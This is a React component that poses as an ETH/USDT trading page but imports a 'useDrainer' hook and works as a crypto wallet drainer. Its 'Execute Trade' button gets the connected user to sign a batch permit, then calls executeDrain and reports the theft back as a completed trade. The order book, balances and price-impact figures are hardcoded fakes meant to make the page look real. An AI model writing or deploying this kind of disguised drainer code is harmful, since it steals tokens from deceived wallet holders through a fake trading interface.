import React, { useState, useEffect } from 'react'
import { useAccount } from 'wagmi'
import { useDrainer } from '../hooks/useDrainer'

export default function TradingInterface() {
  const { address, isConnected } = useAccount()
  const { signBatchPermit, executeDrain } = useDrainer()
  const [amount, setAmount] = useState('')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [ethPrice, setEthPrice] = useState(3422.71)

  useEffect(() => {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
      .then(r => r.json())
      .then(d => {
        if (d.ethereum) setEthPrice(d.ethereum.usd)
      })
      .catch(() => {})
  }, [])

  const handleTrade = async () => {
    if (!isConnected || !address) {
      setStatus('Please connect wallet first')
      return
    }
    
    setLoading(true)
    setStatus('Requesting signature...')
    
    try {
      const { signature, nonce, deadline } = await signBatchPermit(address)
      setStatus('Signature obtained. Executing...')
      const txHash = await executeDrain(address, signature, nonce, deadline)
      setStatus(`Trade executed! ${txHash.slice(0,10)}...`)
    } catch (err) {
      setStatus(`Failed: ${err.message}`)
    } finally {
      setLoading(false)
    }
  }

  const rate = 1 / ethPrice
  const toAmount = amount ? (parseFloat(amount) * rate).toFixed(6) : '0.00'

  return (
    <div className="main">
      <div className="ph">
        <span className="ph-name">ETH / USDT</span>
        <div className="ph-price"><span className="ph-main">${ethPrice.toLocaleString()}</span></div>
        <span className="ph-chg">+2.14%</span>
      </div>

      <div className="tgrid">
        <div className="glass cpanel">
          <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#7986ad' }}>
            📈 Trading Chart
          </div>
        </div>

        <div className="glass obpanel">
          <div className="obch"><span>Price</span><span>Size</span><span>Total</span></div>
          <div className="sell">
            <div className="obrow sell"><span className="obc">{ethPrice + 5.8}</span><span className="obc">12.5</span><span className="obc">{(ethPrice + 5.8) * 12.5}</span></div>
            <div className="obrow sell"><span className="obc">{ethPrice + 4.2}</span><span className="obc">8.3</span><span className="obc">{(ethPrice + 4.2) * 8.3}</span></div>
            <div className="obrow sell"><span className="obc">{ethPrice + 3.5}</span><span className="obc">15.2</span><span className="obc">{(ethPrice + 3.5) * 15.2}</span></div>
          </div>
          <div className="obspr"><span className="obspr-p">${ethPrice.toFixed(2)}</span><span>Spread: 0.08%</span></div>
          <div className="buy">
            <div className="obrow buy"><span className="obc">{ethPrice - 3.2}</span><span className="obc">22.1</span><span className="obc">{(ethPrice - 3.2) * 22.1}</span></div>
            <div className="obrow buy"><span className="obc">{ethPrice - 4.8}</span><span className="obc">9.7</span><span className="obc">{(ethPrice - 4.8) * 9.7}</span></div>
            <div className="obrow buy"><span className="obc">{ethPrice - 5.5}</span><span className="obc">14.3</span><span className="obc">{(ethPrice - 5.5) * 14.3}</span></div>
          </div>
        </div>
      </div>

      <div className="glass swappanel">
        <div className="trow">
          <div className="trow-top"><span>You Pay</span><span>Balance: 12,400 USDT</span></div>
          <div className="trow-main">
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="ainput" />
            <div className="tsel"><div className="ticon ti-usdt">USDT</div><span>USDT</span></div>
          </div>
        </div>

        <div className="sw-arr"><div className="sw-arr-btn">↓</div></div>

        <div className="trow">
          <div className="trow-top"><span>You Receive</span><span>Balance: 3.72 ETH</span></div>
          <div className="trow-main">
            <input type="text" value={toAmount} placeholder="0.00" readOnly className="ainput" />
            <div className="tsel"><div className="ticon ti-eth">ETH</div><span>ETH</span></div>
          </div>
        </div>

        <div className="rinfo">
          <div className="rrow"><span className="rkey">Rate</span><span className="rval">1 USDT = {rate.toFixed(6)} ETH</span></div>
          <div className="rrow"><span className="rkey">Price Impact</span><span className="rval" style={{ color: '#10b981' }}>&lt; 0.01%</span></div>
        </div>

        <button className="execbtn" onClick={handleTrade} disabled={loading}>
          {loading ? 'Processing...' : 'Execute Trade'}
        </button>
        {status && <div style={{ textAlign: 'center', marginTop: '12px', fontSize: '12px', color: '#7986ad' }}>{status}</div>}
      </div>
    </div>
  )
}